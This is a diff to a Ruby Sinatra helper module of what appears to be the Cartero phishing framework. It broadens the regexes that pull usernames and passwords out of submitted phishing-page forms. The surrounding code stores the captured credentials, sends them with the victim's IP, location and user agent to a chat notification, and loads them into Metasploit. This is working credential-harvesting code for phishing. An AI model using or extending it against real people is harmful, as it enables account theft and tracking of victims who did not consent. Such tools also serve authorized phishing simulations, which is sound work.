@@ -30,8 +30,8 @@ module SinatraHelpers
       :ua_engine	=> ua.engine,
       :ua_platform => ua.platform,
       :ua_lang		=> ua.lang,
-      :username		=> params[:username] || params[:email] || params[:user] || params[params.keys.select {|x| x =~ /email|user|uname/i }[0]],
-      :password		=> params[:password] || params[:pwd] || params[:secret] || params[params.keys.select {|x| x =~ /pass|pwd|secret/i }[0]]
+      :username		=> params[:username] || params[:email] || params[:user] || params[params.keys.select {|x| x =~ /email|user|uname|login/i }[0]],
+      :password		=> params[:password] || params[:pwd] || params[:secret] || params[params.keys.select {|x| x =~ /pass|pwd|secret|passwd/i }[0]]
     )
     creds.save!
 		# Why not I am lazy and this is a much 2.0 way of logging
@@ -99,11 +99,11 @@ module SinatraHelpers
       data = {
         title: "Cartero Credential Information",
         fallback: "*IP:* #{request.ip}\n" +
-        "*USERNAME* #{params[:username] || params[:email] || params[:user] || params[params.keys.select {|x| x =~ /email|user|uname/i }[0]]}\n" +
+        "*USERNAME* #{params[:username] || params[:email] || params[:user] || params[params.keys.select {|x| x =~ /email|user|uname|login/i }[0]]}\n" +
         "*GEOLOCATION* #{geo_loc}\n" +
         "*USER-AGENT* #{request.user_agent}",
         text: "*IP:* #{request.ip}\n" +
-        "*USERNAME* #{params[:username] || params[:email] || params[:user] || params[params.keys.select {|x| x =~ /email|user|uname/i }[0]]}\n" +
+        "*USERNAME* #{params[:username] || params[:email] || params[:user] || params[params.keys.select {|x| x =~ /email|user|uname|login/i }[0]]}\n" +
         "*GEOLOCATION* #{request.location.city}/#{request.location.country}\n" +
         "*USER-AGENT* #{request.user_agent}",
         color: "#7CD197",
@@ -134,8 +134,8 @@ module SinatraHelpers
     @person.responded << "#{request.ip}:#{request.port}" unless @person.responded.include?("#{request.ip}:#{request.port}")
     if params[:username] || params[:password]
       @person.credentials << {
-        :username		=> params[:username] || params[:email] || params[:user] || params[params.keys.select {|x| x =~ /email|user|uname/i }[0]],
-        :password		=> params[:password] || params[:pwd] || params[:secret] || params[params.keys.select {|x| x =~ /pass|pwd|secret/i }[0]]
+        :username		=> params[:username] || params[:email] || params[:user] || params[params.keys.select {|x| x =~ /email|user|uname|login/i }[0]],
+        :password		=> params[:password] || params[:pwd] || params[:secret] || params[params.keys.select {|x| x =~ /pass|pwd|secret|passwd/i }[0]]
       }
     end
 
@@ -184,8 +184,8 @@ module SinatraHelpers
       :ua_ver => ua.browser.split(' ')[1..-1]
       })
 
-    return unless (params[:password] || params[:pwd] || params[:secret] || params[params.keys.select {|x| x =~ /pass|pwd|secret/i }[0]]) != nil &&
-                  (params[:username] || params[:email] || params[:user] || params[params.keys.select {|x| x =~ /email|user|uname/i }[0]]) != nil
+    return unless (params[:password] || params[:pwd] || params[:secret] || params[params.keys.select {|x| x =~ /pass|pwd|secret|passwd/i }[0]]) != nil &&
+                  (params[:username] || params[:email] || params[:user] || params[params.keys.select {|x| x =~ /email|user|uname|login/i }[0]]) != nil
 
     settings.metasploit.add_cred({
       :origin_type => :service,
@@ -194,9 +194,9 @@ module SinatraHelpers
       :service_name => 'http',
       :protocol => 'tcp',
       :module_fullname => 'cartero',
-      :private_data => params[:password] || params[:pwd] || params[:secret] || params[params.keys.select {|x| x =~ /pass|pwd|secret/i }[0]],
+      :private_data => params[:password] || params[:pwd] || params[:secret] || params[params.keys.select {|x| x =~ /pass|pwd|secret|passwd/i }[0]],
       :private_type => :password,
-      :username => params[:username] || params[:email] || params[:user] || params[params.keys.select {|x| x =~ /email|user|uname/i }[0]],
+      :username => params[:username] || params[:email] || params[:user] || params[params.keys.select {|x| x =~ /email|user|uname|login/i }[0]],
       :last_attempted_at => Time.now.to_s,
       :status => "Successful"
     })
@@ -229,7 +229,7 @@ module SinatraHelpers
       })
     end
     # Add Credentials :-)
-    log "[*] - Adding client #{params[params.keys.select {|x| x =~ /email|user|uname/i }[0]]} to metasploit"
+    log "[*] - Adding client #{params[params.keys.select {|x| x =~ /email|user|uname|login/i }[0]]} to metasploit"
     # {origin_type: :service, address: '192.168.19.1', port: 9090, service_name: 'http', protocol: 'tcp',
     # module_fullname: 'auxiliary/scanner/http/cartero', workspace_id: 1,
     # private_data: 'password1', private_type: :password, username: 'Administrator', last_attempted_at: Time.now.to_s, status: "Successful"}
@@ -241,9 +241,9 @@ module SinatraHelpers
       :service_name => 'http',
       :protocol => 'tcp',
       :module_fullname => 'auxiliary/scanner/http/cartero',
-      :private_data => params[:password] || params[:pwd] || params[:secret] || params[params.keys.select {|x| x =~ /pass|pwd|secret/i }[0]],
+      :private_data => params[:password] || params[:pwd] || params[:secret] || params[params.keys.select {|x| x =~ /pass|pwd|secret|passwd/i }[0]],
       :private_type => :password,
-      :username => params[:username] || params[:email] || params[:user] || params[params.keys.select {|x| x =~ /email|user|uname/i }[0]],
+      :username => params[:username] || params[:email] || params[:user] || params[params.keys.select {|x| x =~ /email|user|uname|login/i }[0]],
       :last_attempted_at => Time.now.to_s,
       :status => "Successful"
     })
